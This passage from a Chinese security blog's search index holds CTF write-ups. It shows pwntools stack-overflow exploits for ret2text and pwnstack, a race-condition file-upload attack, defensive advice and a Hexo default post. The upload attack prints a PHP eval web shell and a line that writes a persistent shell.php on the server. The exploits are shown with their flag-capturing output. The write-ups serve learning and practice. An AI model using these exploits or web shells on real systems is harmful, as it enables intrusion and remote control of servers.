*0x080486AE </span><span class="hljs-function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="hljs-number">24.</span> </span><span class="hljs-function">gef➤ r </span><span class="hljs-function">There is something amazing here, do you know anything? Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080486ae</span> in main () at ret2text.c:<span class="hljs-number">24</span></span><span class="hljs-function"></span><span class="hljs-function">[ Legend: Modified register | Code | Heap | Stack | String ]</span><span class="hljs-function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><span class="hljs-function">$eax   : <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebx   : <span class="hljs-number">0xf7fac000</span>  →  <span class="hljs-number">0x00229dac</span></span><span class="hljs-function">$ecx   : <span class="hljs-number">0xf7fad9b4</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$edx   : <span class="hljs-number">0x1</span></span><span class="hljs-function">$esp   : <span class="hljs-number">0xffffcf50</span>  →  <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebp   : <span class="hljs-number">0xffffcfd8</span>  →  <span class="hljs-number">0xf7ffd020</span>  →  <span class="hljs-number">0xf7ffda40</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$esi   : <span class="hljs-number">0xffffd094</span>  →  <span class="hljs-number">0xffffd1fc</span>  →  <span class="hljs-string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span><span class="hljs-function">$edi   : <span class="hljs-number">0xf7ffcb80</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$eip   : <span class="hljs-number">0x080486ae</span>  →  &lt;main<span class="hljs-number">+0066</span>&gt; call <span class="hljs-number">0x8048460</span> &lt;gets@plt&gt;</span><span class="hljs-function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><span class="hljs-function">$cs: <span class="hljs-number">0x23</span> $ss: <span class="hljs-number">0x2b</span> $ds: <span class="hljs-number">0x2b</span> $es: <span class="hljs-number">0x2b</span> $fs: <span class="hljs-number">0x00</span> $gs: <span class="hljs-number">0x63</span></span></code></pre></div><ul><li><h4 id="栈内存布局分析"><strong>栈内存布局分析</strong></h4></li></ul><p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p><ul><li><h4 id="验证猜想"><strong>验证猜想</strong></h4><p>通过我们上面的分析可以构造以下payload:</p></li></ul><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">108</span> + p32(target))sh.interactive()</code></pre></div><p>得到以下输出，想想是哪里出了问题呢？</p><div class="code-wrapper"><pre><code class="hljs Bash">~ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1593[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> ![*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive$ <span class="hljs-built_in">ls</span>[*] Process <span class="hljs-string">&#x27;./ret2text&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 1593)[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive</code></pre></div><p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p><div class="code-wrapper"><pre><code class="hljs x86asm">总偏移 = buf 到 <span class="hljs-built_in">EBP</span> 的距离 (<span class="hljs-number">0x6c</span>) + <span class="hljs-built_in">EBP</span> 自身大小 (<span class="hljs-number">4</span>) = <span class="hljs-number">0x70</span> (<span class="hljs-number">112</span>)</code></pre></div><p>因此，正确的payload是：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span><span class="hljs-comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>) + p32(target))sh.interactive()</code></pre></div><p>输出如下：</p><div class="code-wrapper"><pre><code class="hljs Bash">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1766[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> !$ <span class="hljs-built_in">ls</span>exp.py  flag  ret2text$ <span class="hljs-built_in">cat</span> flagflag&#123;This_is_the_right_payload&#125;$[*] Interrupted[*] Stopped process <span class="hljs-string">&#x27;./ret2text&#x27;</span> (pid 1766)</code></pre></div><p>不断更新，敬请期待！</p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-lab靶场小计</title>
    <link href="/2025/02/22/upload-lab%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/"/>
    <url>/2025/02/22/upload-lab%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="upload-labs靶场学习小记">upload-labs靶场学习小记</h2><h6 id="upload-labs靶场项目地址-https-github-com-c0ny1-upload-labs">upload-labs靶场项目地址: <a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></h6><p>先来看Pass-01</p><p>题目描述是<code>本pass在客户端使用js对不合法图片进行检查！</code>我们可以提取其中的关键词<code>js</code>于是设想使用浏览器禁用js来实现绕过，以chrome浏览器为例</p><p>这里有一张图片 ·</p><p>上传并解析成功</p><p>这有一张图片</p><p>然后是Pass-02</p><p>题目描述为<code>本pass在服务端对数据包的MIME进行检查！</code>我们尝试把数据包截取下来进行简单分析</p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全日志</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争漏洞学习</title>
    <link href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Web安全条件竞争漏洞学习">Web安全条件竞争漏洞学习</h2><h4 id="0x00-概述">0x00 概述</h4><p>​条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作">简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6><h4 id="0x01-简单分析">0x01 简单分析</h4><p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p><p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>我们在这里用一段简单的python代码来模拟后端逻辑，处理请求的<code>handle_req()</code>函数是并发（多线程/多进程）执行的：</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> **handle_req**():    <span class="hljs-keyword">if</span> code_already_used = <span class="hljs-literal">False</span>: <span class="hljs-comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span>        use_code()  <span class="hljs-comment"># 使用折扣码，对商品进行打折</span>        code_already_used = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 若已经使用过折扣码</span>        reject_use_code()        <span class="hljs-comment"># 拒绝再次使用折扣码</span></code></pre></div><p>但是这个过程可能会存在条件竞争漏洞，因为我们第一次请求判断的状态为false即未使用折扣码，但是第一个请求执行到第四行时准备更新数据库内容而第二个请求又开始执行并将折扣码使用状态再一次地标记为false，从而造成了使用了两次折扣码，触发了条件竞争漏洞，如下图所示：后端将记录折扣码使用状态为True之前，可能存在条件竞争，上述第2、3行代码执行的时间就是<code>竞争窗口</code>。</p><p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p><p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p><h4 id="0x02-CTF中的条件竞争">0x02 CTF中的条件竞争</h4><p>我们来看这样的一道题目</p><p>【题型】<a href>Web</a><br>【题目】<code>wzsc_文件上传</code><br>【来源】（[攻防世界](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href>条件竞争</a></p><p>我们先上传一个一句话木马并把包拦截下来进行分析测试</p><div class="code-wrapper"><pre><code class="hljs bash">POST /upload.php HTTP/1.1Host: Host:PortContent-Length: 230Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:56903Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLhUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: Host:PortAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close------WebKitFormBoundaryMwWBoiGSKcfAYxLhContent-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;classic.php&quot;</span>Content-Type: application/octet-stream&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;shell&quot;</span>]); ?&gt;------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</code></pre></div><p>我们把它放到Repeater中放出去看看，查看返回包</p><div class="code-wrapper"><pre><code class="hljs bash">HTTP/1.1 200 OKDate: Sat, 08 Feb 2025 09:38:03 GMTServer: Apache/2.4.18 (Ubuntu)Content-Length: 0Connection: closeContent-Type: text/html; charset=UTF-8</code></pre></div><p>我们可以看到这里的状态码是200，证明我们是可以成功上传但是在服务器中被删除了，那这时候可以使用以下思路</p><p>我们先尝试访问我们上传的一句话并拦截包</p><div class="code-wrapper"><pre><code class="hljs bash">GET /upload/classic.php HTTP/1.1Host: 61.147.171.105:56903Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close</code></pre></div><p>这样，我们可以在<code>BurpSuite</code>中同时拦截下这两个数据包，然后发送至Intruder模块，将payload设置为<code>Null Payload</code>，并开始攻击，这样我们还需要搭配上这样的一句PHP代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><p>它的作用是只要我们上传的文件能被成功访问，它就能在服务器上新建一个<code>shell.php</code>并将一句话写入，从而使我们能够成功<code>getshel</code>l~</p><p>用两个不同的数据包设置<code>Null Payload</code>的作用是利用我们提到的“竞争窗口”即上传成功到被删除的这一小段时间去访问我们上传的内鬼让其在服务器上生成一个接应我们的shell，其实简单地说就是用两个不同的操作去同时读写一个文件</p><p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p><p>Success to upload！</p><p>成功拿到flag：<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p><h4 id="0x03-如何防御？">0x03 如何防御？</h4><p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p><p>(1) 使用同步机制<br>锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>互斥量（Mutex）：类似于锁，用于多线程环境。<br>(2) 原子操作<br>使用原子操作确保操作的不可分割性。<br>示例：<br>数据库中的事务（Transaction）。<br>编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>(3) 避免共享资源<br>尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>示例：<br>使用线程本地变量代替全局变量。<br>(4) 文件操作防御<br>使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>(5) 数据库操作防御<br>使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>(6) 时间窗口最小化<br>减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>示例：<br>在文件操作中，尽快释放文件锁。<br>(7) 使用不可变对象<br>使用不可变对象（Immutable Objects）避免共享资源被修改。<br>示例：<br>在函数式编程中，尽量使用不可变数据结构。<br>(8) 输入验证和边界检查<br>对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>示例：<br>检查文件路径、用户权限等。<br>(9) 代码审查和测试<br>通过代码审查发现潜在的竞争条件。<br>使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p><p>常见条件竞争漏洞示例及防御<br>(1) TOCTOU（Time-of-Check to Time-of-Use）</p><div class="code-wrapper"><pre><code class="hljs c">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。防御方法：    使用原子操作（如 open() 的 O_EXCL 标志）。    示例（C 语言）：    c    复制    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0644</span>);    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-comment">// 文件已存在</span>    &#125;</code></pre></div><p>(2) 文件上传漏洞</p><div class="code-wrapper"><pre><code class="hljs python">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。防御方法：    使用临时文件，上传完成后再重命名。    示例：    python    复制    <span class="hljs-keyword">import</span> os    <span class="hljs-keyword">import</span> tempfile    <span class="hljs-keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="hljs-literal">False</span>) <span class="hljs-keyword">as</span> tmp_file:        tmp_file.write(<span class="hljs-string">b&quot;file content&quot;</span>)        tmp_path = tmp_file.name    os.rename(tmp_path, <span class="hljs-string">&quot;final_file.txt&quot;</span>)</code></pre></div><p>(3) 并发修改共享变量</p><div class="code-wrapper"><pre><code class="hljs java">漏洞描述：多个线程同时修改共享变量，导致数据不一致。防御方法：    使用锁或原子操作。    示例（Java）：    java    复制    <span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;    <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">sharedResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateResource</span><span class="hljs-params">()</span> &#123;        sharedResource.incrementAndGet();    &#125;</code></pre></div><h6 id="一些素材来源：">一些素材来源：</h6><p><a href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p><p><a href="https://chat.deepseek.com/">DeepSeek</a></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwnstack题解</title>
    <link href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-pwnstack题解">攻防世界-pwnstack题解</h2><p>这是新博客的第一篇文章，感觉空荡荡的就当一次随笔</p><h4 id="一、简述">一、简述</h4><p>【题型】<a href>PWN</a><br>【题目】<code>pwnstack</code><br>【来源】[攻防世界](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href>栈溢出</a></p><h4 id="二、思路及过程">二、思路及过程</h4><p>Step.1：先使用<code>checksec</code>和<code>file</code>了解有关这个文件的一些信息</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:27:17]</span>$ checksec pwn2[*] <span class="hljs-string">&#x27;/Challenge/Adworld/pwnstack/pwn2&#x27;</span>    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No<span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:30:13] C:1</span>$ file pwn2pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=62aa40d64871e142a32827b4e403772e72f67fba, not stripped</code></pre></div><p>我们从中可以得知它是一个64位的ELF格式文件</p><p>Step.2：放入IDA Pro中进行分析</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-built_in">initsetbuf</span>(argc, argv, envp);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is pwn1,can you do that??&quot;</span>);  <span class="hljs-built_in">vuln</span>();  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>在里面我们发现了一个非常可疑的<code>puts</code> 和<code>vuln</code> 函数，点进去看看</p><div class="code-wrapper"><pre><code class="hljs scss">__int64 <span class="hljs-built_in">vuln</span>()&#123;  char buf<span class="hljs-selector-attr">[160]</span>; <span class="hljs-comment">// [rsp+0h] [rbp-A0h] BYREF</span>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, sizeof(buf));  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>xB1uLL);  return <span class="hljs-number">0</span>LL;&#125;</code></pre></div><p>在vuln函数中我们可以看到函数分配了一个大小为 160 字节的缓冲区 <code>buf</code>，然后使用 <code>read</code> 函数从标准输入（文件描述符 0）读取数据到这个缓冲区中。然而，<code>read</code> 函数被指示读取最多 0xB1（即 177）字节的数据，这比缓冲区 <code>buf</code> 能够容纳的多，从而导致了缓冲区溢出的风险。</p><p>Step.5：shift+F12查看字符串发现<code>/bin/sh</code>，进入发现后门函数，查看地址（ctr+x）发现为：<code>0x400762</code></p><div class="code-wrapper"><pre><code class="hljs c">LOAD:<span class="hljs-number">0000000000400238</span><span class="hljs-number">0000001</span>CC/lib64/ld-linux-x86<span class="hljs-number">-64.</span>so.<span class="hljs-number">2</span>LOAD:<span class="hljs-number">00000000004003B</span>9<span class="hljs-number">0000000</span>AClibc.so.<span class="hljs-number">6</span>LOAD:<span class="hljs-number">00000000004003</span>C8<span class="hljs-number">00000006</span>C<span class="hljs-built_in">stdin</span>LOAD:<span class="hljs-number">00000000004003</span>D3<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stdout</span>LOAD:<span class="hljs-number">00000000004003</span>DA<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stderr</span>LOAD:<span class="hljs-number">00000000004003E1</span><span class="hljs-number">00000007</span>CsystemLOAD:<span class="hljs-number">00000000004003E8</span><span class="hljs-number">00000008</span>CsetvbufLOAD:<span class="hljs-number">00000000004003F</span>0<span class="hljs-number">00000012</span>C__libc_start_mainLOAD:<span class="hljs-number">0000000000400402</span><span class="hljs-number">0000000F</span>C__gmon_start__LOAD:<span class="hljs-number">0000000000400411</span><span class="hljs-number">0000000</span>CCGLIBC_2.<span class="hljs-number">2.5</span>.rodata:<span class="hljs-number">0000000000400838</span><span class="hljs-number">00000008</span>C/bin/sh.rodata:<span class="hljs-number">0000000000400848</span><span class="hljs-number">0000001F</span>Cthis is pwn1,can you <span class="hljs-keyword">do</span> that??.eh_frame:<span class="hljs-number">000000000040091F</span><span class="hljs-number">00000006</span>C;*<span class="hljs-number">3</span>$\<span class="hljs-string">&quot;</span></code></pre></div><p>Step.6：构造exp并caught到flag</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<span class="hljs-attribute">p</span>=remote(&quot;Host&quot;,Port)<span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0xa8+p64(0x400762)p.sendline(payload)p.interactive()</code></pre></div><p>在上面的exp代码中使用了<code>pwntools</code>库并连接到远程服务器，随后我们构造了一个长度为”0xa8“并用’a’去填充和类型为二进制数据的payload，并覆盖返回地址到<code>0x400762</code>并将返回地址转换为小端序的64位进行表示</p><div class="code-wrapper"><pre><code class="hljs bash">zer0-r1ng @ ring0rez-Laptop <span class="hljs-keyword">in</span> ~/Challenge/Adworld/pwnstack/[16:50:22]$ python3 exp.py[+] Opening connection to 61.147.171.105 on port 54428: Done[*] Switching to interactive modethis is pwn1,can you <span class="hljs-keyword">do</span> that??$ <span class="hljs-built_in">ls</span>bindevflagliblib32lib64pwn2$ <span class="hljs-built_in">cat</span> flagcyberpeace&#123;9d0526386a432e6fcf65858cd1ee804d&#125;</code></pre></div><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/05/hello-world/"/>
    <url>/2025/02/05/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
